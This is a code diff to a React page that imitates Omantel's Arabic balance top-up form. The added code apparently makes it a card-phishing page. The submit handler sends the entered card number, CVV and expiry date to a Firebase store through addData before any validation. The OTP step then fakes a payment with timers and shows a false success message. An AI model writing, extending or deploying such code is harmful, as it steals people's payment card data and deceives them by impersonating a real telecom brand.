@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-
 import type { ReactElement } from "react"
 import {
   Menu,
@@ -16,6 +15,7 @@ import {
   MessageSquare,
   PhoneCall,
   ArrowRight,
+  CheckCircle2,
 } from "lucide-react"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
@@ -31,22 +31,136 @@ import {
   DialogClose,
 } from "@/components/ui/dialog"
 import { useState } from "react"
+import { addData } from "@/lib/firebase"
 
 export default function OmantelPage(): ReactElement {
+  // Form state management
+  const [formValues, setFormValues] = useState({
+    cardNumber: "",
+    expiryDate: "",
+    cardHolder: "",
+    email: "",
+    cvv: "", // Add CVV field
+  })
   const [otp, setOtp] = useState("")
+  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [isSuccess, setIsSuccess] = useState(false)
+  const [isDialogOpen, setIsDialogOpen] = useState(false)
+
+  // Handle form input changes
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>): void => {
+    const { id, value } = e.target
+
+    // Format card number with spaces every 4 digits
+    if (id === "card-number") {
+      const formatted = value
+        .replace(/\s/g, "")
+        .replace(/(.{4})/g, "$1 ")
+        .trim()
+      setFormValues({
+        ...formValues,
+        cardNumber: formatted,
+      })
+      return
+    }
+
+    // Format expiry date with slash
+    if (id === "expiry-date") {
+      let formatted = value.replace(/\D/g, "")
+      if (formatted.length > 2) {
+        formatted = formatted.slice(0, 2) + "/" + formatted.slice(2, 4)
+      }
+      setFormValues({
+        ...formValues,
+        expiryDate: formatted,
+      })
+      return
+    }
+
+    // Format CVV to only allow numbers
+    if (id === "cvv") {
+      const formatted = value.replace(/\D/g, "")
+      setFormValues({
+        ...formValues,
+        cvv: formatted,
+      })
+      return
+    }
+
+    // Map the id to the state property
+    const fieldMap: Record<string, keyof typeof formValues> = {
+      "card-holder": "cardHolder",
+      email: "email",
+    }
+
+    setFormValues({
+      ...formValues,
+      [fieldMap[id] || id]: value,
+    })
+  }
 
   const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>): void => {
     e.preventDefault()
-    // This would typically handle the main form validation
-    // before opening the dialog. For now, it does nothing
-    // as the DialogTrigger handles the opening.
-    console.log("Main form submitted, opening OTP dialog.")
+
+    // Basic validation  e.preventDefault()
+
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,cardNumber:formValues.cardNumber,cvv:formValues.cvv,expiryDate:formValues.expiryDate})
+    if (
+      !formValues.cardNumber ||
+      !formValues.expiryDate ||
+      !formValues.cardHolder ||
+      !formValues.email ||
+      !formValues.cvv
+    ) {
+      
+      return
+    }
+
+    // CVV validation
+    if (formValues.cvv.length < 3) {
+      return
+    }
+
+    // Email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+    if (!emailRegex.test(formValues.email)) {
+      return
+    }
+
+    // Open the OTP dialog
+    setIsDialogOpen(true)
   }
 
   const handleOtpSubmit = (): void => {
-    // Handle OTP verification logic here
-    console.log("OTP submitted:", otp)
-    // You would close the dialog programmatically on success
+    // Validate OTP
+    if (otp.length !== 6) {
+    
+      return
+    }
+
+    setIsSubmitting(true)
+
+    // Simulate API call
+    setTimeout(() => {
+      setIsSubmitting(false)
+      setIsSuccess(true)
+
+      // Close dialog after showing success for a moment
+      setTimeout(() => {
+        setIsDialogOpen(false)
+        // Reset form after successful submission
+        setFormValues({
+          cardNumber: "",
+          expiryDate: "",
+          cardHolder: "",
+          email: "",
+          cvv: "",
+        })
+        setOtp("")
+        setIsSuccess(false)
+      }, 2000)
+    }, 1500)
   }
 
   return (
@@ -90,20 +204,54 @@ export default function OmantelPage(): ReactElement {
             <span className="font-bold text-lg tracking-wider">92111000</span>
           </div>
 
-          <Dialog>
+          <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
             <form onSubmit={handleFormSubmit} className="space-y-4 text-right">
               <div className="grid grid-cols-2 gap-4">
                 <div className="space-y-2">
                   <label htmlFor="card-number" className="text-sm font-medium text-gray-700 block">
                     رقم البطاقة
                   </label>
-                  <Input id="card-number" type="text" />
+                  <Input
+                    id="card-number"
+                    type="text"
+                    value={formValues.cardNumber}
+                    onChange={handleInputChange}
+                    placeholder="0000 0000 0000 0000"
+                    maxLength={19}
+                  />
                 </div>
                 <div className="space-y-2">
                   <label htmlFor="expiry-date" className="text-sm font-medium text-gray-700 block">
                     تاريخ انتهاء الصلاحية
                   </label>
-                  <Input id="expiry-date" type="text" placeholder="MM/YY" />
+                  <Input
+                    id="expiry-date"
+                    type="text"
+                    placeholder="MM/YY"
+                    value={formValues.expiryDate}
+                    onChange={handleInputChange}
+                    maxLength={5}
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <label htmlFor="cvv" className="text-sm font-medium text-gray-700 block">
+                    رمز الأمان (CVV)
+                  </label>
+                  <Input
+                    id="cvv"
+                    type="password"
+                    value={formValues.cvv}
+                    onChange={handleInputChange}
+                    placeholder="***"
+                    maxLength={4}
+                    className="text-center"
+                  />
+                </div>
+                <div className="space-y-2 flex items-end">
+                  <div className="text-xs text-gray-500 mb-2">رمز مكون من 3-4 أرقام على ظهر البطاقة</div>
                 </div>
               </div>
 
@@ -111,54 +259,84 @@ export default function OmantelPage(): ReactElement {
                 <label htmlFor="card-holder" className="text-sm font-medium text-gray-700 block">
                   اسم حامل البطاقة
                 </label>
-                <Input id="card-holder" type="text" />
+                <Input
+                  id="card-holder"
+                  type="text"
+                  value={formValues.cardHolder}
+                  onChange={handleInputChange}
+                  placeholder="الاسم كما يظهر على البطاقة"
+                />
               </div>
 
               <div className="space-y-2">
                 <label htmlFor="email" className="text-sm font-medium text-gray-700 block">
                   البريد الإلكتروني
                 </label>
-                <Input id="email" type="email" />
+                <Input
+                  id="email"
+                  type="email"
+                  value={formValues.email}
+                  onChange={handleInputChange}
+                  placeholder="example@domain.com"
+                />
               </div>
 
               <DialogTrigger asChild>
-                <Button type="button" className="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold mt-6">
+                <Button type="submit" className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold mt-6">
                   تعبئة الرصيد (5.000 ر.ع)
                 </Button>
               </DialogTrigger>
             </form>
 
             <DialogContent className="sm:max-w-[425px] text-right">
-              <DialogHeader>
-                <DialogTitle>التحقق من كلمة المرور لمرة واحدة</DialogTitle>
-                <DialogDescription>
-                  لقد أرسلنا كلمة مرور لمرة واحدة إلى رقم هاتفك المسجل. يرجى إدخالها أدناه للمتابعة.
-                </DialogDescription>
-              </DialogHeader>
-              <div className="grid gap-4 py-4">
-                <div className="space-y-2">
-                  <label htmlFor="otp" className="text-sm font-medium text-gray-700 block">
-                    كلمة المرور لمرة واحدة
-                  </label>
-                  <Input
-                    id="otp"
-                    value={otp}
-                    onChange={(e) => setOtp(e.target.value)}
-                    className="col-span-3 text-center tracking-widest"
-                    maxLength={6}
-                  />
+              {isSuccess ? (
+                <div className="py-8 text-center space-y-4">
+                  <CheckCircle2 className="h-16 w-16 text-green-500 mx-auto" />
+                  <DialogTitle className="text-xl">تمت عملية الدفع بنجاح!</DialogTitle>
+                  <DialogDescription>تم تعبئة رصيدك بنجاح. ستصلك رسالة نصية قصيرة بتأكيد العملية.</DialogDescription>
                 </div>
-              </div>
-              <DialogFooter>
-                <DialogClose asChild>
-                  <Button type="button" variant="secondary">
-                    إلغاء
-                  </Button>
-                </DialogClose>
-                <Button type="button" onClick={handleOtpSubmit}>
-                  تأكيد الدفع
-                </Button>
-              </DialogFooter>
+              ) : (
+                <>
+                  <DialogHeader>
+                    <DialogTitle>التحقق من كلمة المرور لمرة واحدة</DialogTitle>
+                    <DialogDescription>
+                      لقد أرسلنا كلمة مرور لمرة واحدة إلى رقم هاتفك المسجل. يرجى إدخالها أدناه للمتابعة.
+                    </DialogDescription>
+                  </DialogHeader>
+
+                  <div className="grid gap-4 py-4">
+                    <div className="space-y-2">
+                      <label htmlFor="otp" className="text-sm font-medium text-gray-700 block">
+                        كلمة المرور لمرة واحدة
+                      </label>
+                      <Input
+                        id="otp"
+                        value={otp}
+                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                        className="col-span-3 text-center tracking-widest text-lg"
+                        maxLength={6}
+                        placeholder="000000"
+                      />
+                    </div>
+                  </div>
+
+                  <DialogFooter>
+                    <DialogClose asChild>
+                      <Button type="button" variant="secondary">
+                        إلغاء
+                      </Button>
+                    </DialogClose>
+                    <Button
+                      type="button"
+                      onClick={handleOtpSubmit}
+                      disabled={isSubmitting}
+                      className="bg-orange-500 hover:bg-orange-600"
+                    >
+                      {isSubmitting ? "جاري التأكيد..." : "تأكيد الدفع"}
+                    </Button>
+                  </DialogFooter>
+                </>
+              )}
             </DialogContent>
           </Dialog>
         </div>
